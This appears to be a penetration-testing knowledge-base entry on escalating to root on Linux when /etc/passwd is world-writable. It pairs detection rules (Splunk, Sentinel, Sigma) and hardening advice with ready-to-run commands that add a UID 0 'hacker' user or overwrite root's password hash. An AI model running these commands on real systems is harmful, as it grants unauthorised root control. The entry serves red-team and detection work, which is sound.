name: Writable /etc/passwd - Add Root-Equivalent User
description: If /etc/passwd is world-writable (misconfiguration), you can add a new user with UID 0 (root equivalent) or replace root's password hash directly. Works because Linux checks /etc/passwd before /etc/shadow for password hashes if present. One of the fastest linux privesc paths.
notes:
=== CHECK ===
  ls -la /etc/passwd
  # Look for -rw-rw-rw- or any write permission for your user/group

=== METHOD 1: Add new root user ===
  # Generate password hash
  openssl passwd -1 newpass
  # Output: $1$xyz$...

  # Add user with UID 0
  echo 'hacker:$1$xyz$hash_here:0:0:root:/root:/bin/bash' >> /etc/passwd

  # Switch to new user
  su hacker
  # Password: newpass
  # You are now root (UID 0)

=== METHOD 2: Replace root password ===
  # Generate hash
  openssl passwd -1 newpass
  # Edit root's entry to include the hash
  # Change root:x: to root:$1$xyz$hash:

=== METHOD 3: Python one-liner ===
  python3 -c "import crypt; print('hacker:' + crypt.crypt('pass123') + ':0:0::/root:/bin/bash')" >> /etc/passwd

=== WHY IT WORKS ===
Historically, password hashes were stored in /etc/passwd (the 'x'
in the second field means 'look in /etc/shadow instead'). If you
put an actual hash there, Linux uses it directly, bypassing shadow.

=== ALSO CHECK ===
  ls -la /etc/shadow    # writable shadow = same attack
  ls -la /etc/sudoers   # writable sudoers = add sudo rights

examples.label: Generate password hash and add root user

defense.why_it_works: Linux reads /etc/passwd for user information and falls back to password hashes stored there if the 'x' placeholder is replaced with an actual hash.
defense.impact: Immediate root access by creating a UID 0 user.
defense.detection: [MITRE T1078.003] Modifications to /etc/passwd; new UID 0 users; file integrity monitoring alerts.
defense.artifacts: Modified /etc/passwd with new entries; new UID 0 user in the system.
defense.splunk_spl:
index=linux sourcetype=linux:audit name="/etc/passwd" key="success"
| where syscall="open" AND (a1="O_WRONLY" OR a1="O_RDWR")
| table _time, uid, exe, key
defense.sentinel_kql:
Syslog
| where SyslogMessage contains "/etc/passwd" and SyslogMessage contains "WRITE"
| project TimeGenerated, Computer, SyslogMessage
defense.prevention: Ensure /etc/passwd is owned by root with 644 permissions; use file integrity monitoring (AIDE, OSSEC); enforce /etc/shadow for password storage.

detections.name: Write to /etc/passwd
detections.logic:
title: Modification of /etc/passwd
status: stable
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: PATH
    name: '/etc/passwd'
  filter:
    key: 'shadow-utils'
  condition: selection and not filter
level: critical
detections.false_positives: Legitimate user management via useradd/usermod (filtered by key)
detections.tuning: Exclude changes by known user management tools via audit key filtering

recommended.note: SUID enumeration often reveals writable file paths.
